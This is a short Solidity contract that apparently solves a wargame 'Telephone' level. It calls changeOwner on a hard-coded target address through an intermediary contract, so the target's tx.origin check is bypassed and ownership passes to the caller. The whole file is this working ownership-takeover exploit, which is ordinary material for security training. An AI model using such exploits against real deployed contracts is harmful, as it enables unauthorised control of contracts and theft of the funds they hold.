// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

interface ITelephone {
    function changeOwner(address) external;
}

contract TelephoneTo {
    ITelephone public telephone;

    constructor() {
        telephone = ITelephone(0xebB3bba65BB66cfA541949a7276F4044F6B2206c);
    }

    function telephoneTo() public {
        telephone.changeOwner(msg.sender);
    }
}
